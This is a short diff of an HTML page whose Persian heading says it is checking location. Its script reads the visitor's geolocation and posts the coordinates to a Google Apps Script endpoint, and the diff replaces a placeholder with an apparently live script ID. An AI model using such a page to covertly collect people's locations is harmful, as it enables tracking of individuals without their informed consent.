@@ -7,7 +7,7 @@
   <h2>در حال بررسی موقعیت مکانی...</h2>
   <script>
 navigator.geolocation.getCurrentPosition(function(position) {
-  fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
+  fetch("https://script.google.com/macros/s/AKfycbyyn2gDFP1e8kP0TKh0xrv62_-i8KaaiL1_5ZNiE-9Dpczk5TDvzoOkQ0cTdRTmeLrDuA/exec", {
     method: "POST",
     body: JSON.stringify({
       lat: position.coords.latitude,
